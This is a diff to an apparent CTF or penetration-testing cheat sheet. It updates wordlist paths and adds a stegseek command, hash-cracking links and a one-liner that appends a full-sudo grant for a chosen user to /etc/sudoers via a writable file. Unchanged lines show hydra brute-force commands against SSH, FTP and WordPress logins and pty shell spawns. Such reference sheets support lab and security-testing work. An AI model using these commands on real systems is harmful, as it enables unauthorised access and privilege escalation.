@@ -9,11 +9,15 @@ nmap -sV -p- <TARGET_IP>
 ## Directory and File Discovery
 
 ```bash
-gobuster dir -u http://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,js
+gobuster dir -u https://<TARGET_IP> -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
 ```
 
 ```bash
-gobuster dir -u https://<TARGET_IP> -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
+gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php,js
+```
+
+```bash
+gobuster dir -u https://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
 ```
 
 ## SMB and NetBIOS Enumeration
@@ -77,6 +81,12 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
+## Sudo Privilege Modification
+
+```bash
+echo 'echo "<USER_NAME> ALL=(ALL:ALL) ALL" >> /etc/sudoers;' >> <FILE_NAME>
+```
+
 # Windows Privilege Escalation and System Commands
 
 ```bash
@@ -98,11 +108,15 @@ exiftool <IMAGE_NAME>.jpg
 ## Hidden Data Extraction
 
 ```bash
-steghide extract -sf <IMAGE_NAME>.jpg
+stegseek <IMAGE_NAME>.jpg
 ```
 
 ```bash
 binwalk -e <IMAGE_NAME>.png
+```
+
+```bash
+steghide extract -sf <IMAGE_NAME>.jpg
 ```
 
 ## Binwalk Compatibility Fix
@@ -122,23 +136,23 @@ crunch 18 18 -t '@@@@' > file.txt
 ## Network Service Brute Force Attacks
 
 ```bash
-hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt ssh://<ATTACKER_IP>
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ssh://<ATTACKER_IP>
 ```
 
 ```bash
-hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt ftp://<ATTACKER_IP>
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt ftp://<ATTACKER_IP>
 ```
 
 ```bash
-hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-get -s 8080 /
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <ATTACKER_IP> http-get -s 8080 /
 ```
 
 ```bash
-hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=Invalid username"
 ```
 
 ```bash
-hydra -l <LOGIN> -P /root/Tools/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
+hydra -l <LOGIN> -P /usr/share/wordlists/rockyou.txt <ATTACKER_IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username" -t 30
 ```
 
 ## Archive Password Cracking
@@ -271,3 +285,5 @@ cd /etc/cron.d
 - [dCode](https://www.dcode.fr/en)
 - [GTFOBins](https://gtfobins.github.io/)
 - [Exploit Database](https://www.exploit-db.com/)
+- [CrackStation](https://crackstation.net/)
+- [MD5Hashing.net](https://md5hashing.net)
